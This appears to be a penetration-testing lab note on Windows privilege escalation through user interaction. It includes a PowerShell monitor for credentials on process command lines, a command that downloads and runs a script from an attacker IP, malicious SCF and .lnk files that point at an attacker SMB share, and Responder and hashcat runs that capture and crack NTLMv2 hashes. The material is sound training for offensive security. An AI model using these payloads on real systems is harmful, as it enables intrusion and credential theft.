# Interacting with Users

The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file.&#x20;

## **Process Command Lines**

### **Monitoring for Process Command Lines**

display scheduled tasks or other processes being executed which pass credentials on the command line

```powershell
# create script on attack then transfer to victim 
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### **Running Monitor Script on Target Host**

```powershell
PS C:\htb> IEX (iwr 'http://10.10.15.150/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
**@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>**       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

This is successful and reveals the password for the `sqlsvc` domain user

***

## **Vulnerable Services**

[CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) : in this vulnerability docker search on file call `docker-credential-wincred.bat` or `docker-credential-wincred.exe` which search on this path `C:\PROGRAMDATA\DockerDesktop\version-bin\` but this path allow anyone to full write access

***

## **SCF on a File Share**

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share

بمعني اننا ممكن نغير الايقون فايل بحيث تشاور علي سيرفر ال SMB و نشغل تولز و ظيفتها انها تسنيف عن النيتورك دي و تعرض اي هاش ل اي حد اتصفح الشير دا

### **Malicious SCF File**

let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. put your ip and any fake name `.ico`

```powershell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### **Starting Responder**

```bash
irix@htb[/htb]$ sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
```

### **Cracking NTLMv2 Hash with Hashcat**

```bash
irix@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000
Time.Started.....: Thu May 27 19:16:18 2021 (1 sec)
Time.Estimated...: Thu May 27 19:16:19 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

## **Capturing Hashes with a Malicious .lnk File**

SFCs not work on Server 2019 hosts , but we can achieve the same effect using a malicious`.lnk` file (shortcut file). We can use various tools to generate a malicious .lnk file, such as [**`Lnkbomb`**](https://github.com/dievus/lnkbomb)

Powershell file

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

file to allow connect on SMB share
